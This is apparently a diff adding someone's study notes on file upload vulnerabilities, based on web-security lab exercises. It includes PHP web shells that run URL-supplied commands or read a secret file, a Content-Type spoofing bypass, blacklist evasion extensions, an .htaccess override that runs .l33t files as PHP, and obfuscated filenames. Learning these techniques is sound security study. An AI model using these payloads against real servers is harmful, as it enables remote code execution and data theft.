@@ -143,3 +143,99 @@ In the absence of a MIME type, or in certain cases where browsers believe they a
 
 Servers can prevent MIME sniffing by sending the X-Content-Type-Options heade
 ```
+
+# 13-11-2023
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>in php.php
+
+<?php echo system($_GET['command']); ?>
+This script takes a command as a parameter from the URL query string using $_GET['command'] and then executes it using the system function. The system function in PHP is used to execute an external command and display the output.
+
+GET /example/exploit.php?command=id HTTP/1.1
+
+pdf multipart/form-data
+application/x-www-form-url-encoded for baseic html forms
+
+```
+### example of a basic from submisstion
+```
+POST /images HTTP/1.1
+Host: normal-website.com
+Content-Length: 12345
+Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="image"; filename="example.jpg"
+Content-Type: image/jpeg
+
+[...binary content of example.jpg...]
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="description"
+
+This is an interesting description of my image.
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name="username"
+
+wiener
+---------------------------012345678901234567890123456--
+```
+
+```
+he message body is split into separate parts for each of the form's inputs. Each part contains a Content-Disposition header, which provides some basic information about the input field it relates to. These individual parts may also contain their own Content-Type header, which tells the server the MIME type of the data that was submitted using this input.
+->>>>>>>> Content-Type header matches an expected MIME type.
+```
+### web shell uplad via content type restriction bypass
+```
+application/x-php==>image/png
+```
+```
+servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:
+
+GET /static/exploit.php?command=id HTTP/1.1
+Host: normal-website.com
+
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 39
+
+<?php echo system($_GET['command']); ?>
+
+
+his kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.
+```
+### web shell upload via path traversal
+```
+```
+### Insufficient blacklisting of dangerous file types
+.php5, .shtml
+### Overriding the server configuration
+```
+web shell upload via file extension blacklist bpass
+before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their /etc/apache2/apache2.conf file:
+
+LoadModule php_module /usr/lib/apache2/modules/libphp.so
+AddType application/x-httpd-php .php
+
+ Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present.
+
+similarly, developers can make directory-specific configuration on IIS servers using a web.config file.
+AddType application/x-httpd-php .l33t
+treet/process files with extension .133t as php
+```
+### apache special
+```
+Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is presen
+https://cets.seas.upenn.edu/answers/addtype.
+AddType application/x-httpd-php .l33t
+```
+### obfuscating file extensions
+![image](https://github.com/radha-m0wn1ka/radha-m0wn1ka.github.io/assets/64199052/b3e5ca32-1b78-4293-9dbd-334ab629cc9f)
+exploit.p.phphp
+### polygot images
+```
+What is a polyglot? Just like PNG, JPEG, and DOC are valid file types, polyglots are a combination of two different file types. For example Phar + JPEG (PHP archive and JPEG file), GIFAR (Gif and Rar file) Javascript + JPEG, etc
+```
+
